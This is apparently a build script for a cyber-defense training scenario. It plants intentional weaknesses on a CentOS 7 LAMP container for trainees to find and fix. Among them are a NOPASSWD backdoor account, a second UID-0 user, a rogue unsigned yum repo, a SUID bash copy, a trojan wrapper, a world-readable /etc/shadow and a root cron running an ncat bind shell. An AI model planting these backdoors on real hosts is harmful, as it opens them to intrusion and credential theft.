#!/usr/bin/env bash
# Hivestorm scenario-12 — CentOS 7 LAMP misconfigurations.
# Runs at image build time. Reads randomized identities from
# /etc/sysrepair/roles.json and plants issues keyed off those names.
set -euo pipefail

ROLES=/etc/sysrepair/roles.json

# CentOS 7 repos are archived — rewrite before any yum operation.
cat >/etc/yum.repos.d/CentOS-Base.repo <<'EOF'
[base]
name=CentOS-7 - Base
baseurl=http://vault.centos.org/7.9.2009/os/x86_64/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7

[updates]
name=CentOS-7 - Updates
baseurl=http://vault.centos.org/7.9.2009/updates/x86_64/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7

[extras]
name=CentOS-7 - Extras
baseurl=http://vault.centos.org/7.9.2009/extras/x86_64/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
EOF
rm -f /etc/yum.repos.d/CentOS-CR.repo /etc/yum.repos.d/CentOS-Sources.repo \
      /etc/yum.repos.d/CentOS-Vault.repo /etc/yum.repos.d/CentOS-fasttrack.repo \
      /etc/yum.repos.d/CentOS-Debuginfo.repo /etc/yum.repos.d/CentOS-Media.repo

yum -y --setopt=tsflags=nodocs install epel-release >/dev/null 2>&1
yum -y --setopt=tsflags=nodocs install \
    httpd mariadb mariadb-server openssh-server openssh-clients \
    sudo procps-ng iproute policycoreutils vsftpd xinetd telnet-server \
    jq which cronie >/dev/null 2>&1

# ---- parse roles -------------------------------------------------------------
ADMIN=$(jq -r .admin_user           "$ROLES")
ADMINPW=$(jq -r .admin_weak_password "$ROLES")
BACKDOOR=$(jq -r .backdoor_user     "$ROLES")
EXTRA_UID0=$(jq -r .extra_uid0_user "$ROLES")
NONADMIN=$(jq -r .nonadmin_user     "$ROLES")
SUDOERS_DROP=$(jq -r .sudoers_drop_name "$ROLES")
ROGUE_REPO=$(jq -r .rogue_yum_repo_name "$ROLES")
ROGUE_REPO_URL=$(jq -r .rogue_yum_repo_url "$ROLES")
TROJAN=$(jq -r .trojan_path         "$ROLES")
SUID_PLANT=$(jq -r .suid_plant      "$ROLES")
CRON_NAME=$(jq -r .cron_name        "$ROLES")
CRON_PATH=$(jq -r .cron_path        "$ROLES")
LISTENER_PORT=$(jq -r .listener_port "$ROLES")

# ---- users -------------------------------------------------------------------
# Legit admin (needs to survive).
useradd -m -s /bin/bash "$ADMIN"
echo "${ADMIN}:${ADMINPW}" | chpasswd
usermod -aG wheel "$ADMIN"

# Non-admin regular user (present so the plant below targets something).
useradd -m -s /bin/bash "$NONADMIN"
echo "${NONADMIN}:${NONADMIN}-pass" | chpasswd

# Backdoor account: planted by intruder, extra wheel member.
useradd -m -s /bin/bash "$BACKDOOR"
echo "${BACKDOOR}:${BACKDOOR}-pass" | chpasswd
usermod -aG wheel "$BACKDOOR"

# Second UID-0 (classic persistence).
useradd -M -o -u 0 -g 0 -s /bin/bash "$EXTRA_UID0"
echo "${EXTRA_UID0}:${EXTRA_UID0}-pass" | chpasswd

# /etc/securetty relaxed: allow root on any tty.
printf 'console\ntty1\ntty2\ntty3\nttyS0\nttyS1\npts/0\npts/1\n' >/etc/securetty

# ---- sudoers drop-in: NOPASSWD for backdoor ----------------------------------
cat >"/etc/sudoers.d/${SUDOERS_DROP}" <<EOF
${BACKDOOR} ALL=(ALL) NOPASSWD: ALL
EOF
chmod 0440 "/etc/sudoers.d/${SUDOERS_DROP}"

# ---- sshd hardening (intentionally weak) -------------------------------------
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#\?PermitEmptyPasswords.*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
# Generate host keys for the supervisor to start sshd.
ssh-keygen -A

# ---- PAM / login.defs weakness ----------------------------------------------
# Strip pam_pwquality and pam_faillock from system-auth; leave plain pam_unix.
cat >/etc/pam.d/system-auth <<'EOF'
#%PAM-1.0
auth        required      pam_env.so
auth        sufficient    pam_unix.so nullok try_first_pass
auth        required      pam_deny.so

account     required      pam_unix.so

password    sufficient    pam_unix.so md5 shadow nullok try_first_pass
password    required      pam_deny.so

session     optional      pam_keyinit.so revoke
session     required      pam_limits.so
session     required      pam_unix.so
EOF
cp /etc/pam.d/system-auth /etc/pam.d/password-auth
sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS 99999/' /etc/login.defs
sed -i 's/^UMASK.*/UMASK 022/' /etc/login.defs

# ---- firewalld represented as config state (container has no kernel nf) ----
# Mark firewalld as "disabled" by dropping a mask-equivalent file and default
# zone switched to 'trusted'. verify.sh looks at file state only.
mkdir -p /etc/firewalld
cat >/etc/firewalld/firewalld.conf <<'EOF'
DefaultZone=trusted
MinimalMark=100
CleanupOnExit=yes
Lockdown=no
IPv6_rpfilter=no
EOF
# Simulate `systemctl disable firewalld` — decoy symlink file for verify.
mkdir -p /etc/systemd/system/multi-user.target.wants
rm -f /etc/systemd/system/multi-user.target.wants/firewalld.service
touch /etc/sysrepair/firewalld.disabled

# ---- SELinux: permissive + booleans flipped (config state) -------------------
mkdir -p /etc/selinux
cat >/etc/selinux/config <<'EOF'
SELINUX=permissive
SELINUXTYPE=targeted
EOF
# Record booleans the intruder flipped (verify.sh reads these from file state
# since setsebool requires an enforcing kernel).
mkdir -p /etc/sysrepair
cat >/etc/sysrepair/selinux-booleans <<'EOF'
httpd_can_network_connect=on
httpd_execmem=on
httpd_enable_cgi=on
EOF

# ---- yum.conf + rogue repo --------------------------------------------------
sed -i 's/^gpgcheck=.*/gpgcheck=0/' /etc/yum.conf || echo 'gpgcheck=0' >>/etc/yum.conf
cat >"/etc/yum.repos.d/${ROGUE_REPO}.repo" <<EOF
[${ROGUE_REPO}]
name=${ROGUE_REPO}
baseurl=${ROGUE_REPO_URL}
enabled=1
gpgcheck=0
EOF

# ---- httpd: mod_status exposed + ServerTokens Full --------------------------
cat >/etc/httpd/conf.d/hivestorm-status.conf <<'EOF'
ExtendedStatus On
<Location "/server-status">
    SetHandler server-status
    Require all granted
</Location>
EOF
sed -i 's/^ServerTokens.*/ServerTokens Full/' /etc/httpd/conf/httpd.conf || \
    echo 'ServerTokens Full' >>/etc/httpd/conf/httpd.conf
sed -i 's/^ServerSignature.*/ServerSignature On/' /etc/httpd/conf/httpd.conf || \
    echo 'ServerSignature On' >>/etc/httpd/conf/httpd.conf
# Directory-listing on /var/www/html/public.
mkdir -p /var/www/html/public
echo 'placeholder' >/var/www/html/public/readme.txt
cat >/etc/httpd/conf.d/hivestorm-indexes.conf <<'EOF'
<Directory "/var/www/html/public">
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
EOF

# ---- mariadb: initialize DB + leave root no-password ------------------------
mysql_install_db --user=mysql --datadir=/var/lib/mysql >/dev/null 2>&1 || true
# bind to all interfaces (intentional misconfig).
mkdir -p /etc/my.cnf.d
cat >/etc/my.cnf.d/hivestorm.cnf <<'EOF'
[mysqld]
bind-address=0.0.0.0
skip-name-resolve
EOF

# ---- vsftpd anonymous + telnet via xinetd -----------------------------------
cat >/etc/vsftpd/vsftpd.conf <<'EOF'
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
write_enable=YES
local_enable=NO
listen=YES
listen_ipv6=NO
EOF
mkdir -p /etc/xinetd.d
cat >/etc/xinetd.d/telnet <<'EOF'
service telnet
{
    disable         = no
    flags           = REUSE
    socket_type     = stream
    wait            = no
    user            = root
    server          = /usr/sbin/in.telnetd
}
EOF

# ---- trojan binary + listener cron ------------------------------------------
mkdir -p "$(dirname "$TROJAN")"
cat >"$TROJAN" <<EOF
#!/bin/bash
# intruder-planted trojan — logs invocations, sometimes calls out.
echo "\$(date) \$0 \$@" >>/tmp/.hs-keys 2>/dev/null || true
exec /bin/bash "\$@"
EOF
chmod 0755 "$TROJAN"

# SUID plant.
mkdir -p "$(dirname "$SUID_PLANT")"
cp /bin/bash "$SUID_PLANT"
chmod u+s "$SUID_PLANT"

# Listener cron (planted by intruder).
cat >"$CRON_PATH" <<EOF
* * * * * root /usr/bin/ncat -lk -p ${LISTENER_PORT} -e /bin/bash >/dev/null 2>&1 || true
EOF
chmod 0644 "$CRON_PATH"

# /etc/shadow perms loosened (classic).
chmod 0644 /etc/shadow || true

# ---- supervisor -------------------------------------------------------------
cat >/usr/local/sbin/hs-start.sh <<'EOF'
#!/usr/bin/env bash
# Minimal supervisor — container has no systemd.
set -e
mkdir -p /var/run/sshd /run/mariadb
chown mysql:mysql /run/mariadb /var/lib/mysql 2>/dev/null || true

# sshd
/usr/sbin/sshd -D &

# mariadb
sudo -u mysql /usr/libexec/mysqld --datadir=/var/lib/mysql \
    --socket=/var/lib/mysql/mysql.sock --user=mysql &

# httpd (foreground-ish)
/usr/sbin/httpd -DFOREGROUND &

# crond so our planted cron fires.
crond -n &

wait
EOF
chmod 0755 /usr/local/sbin/hs-start.sh

yum clean all >/dev/null 2>&1 || true
rm -rf /var/cache/yum
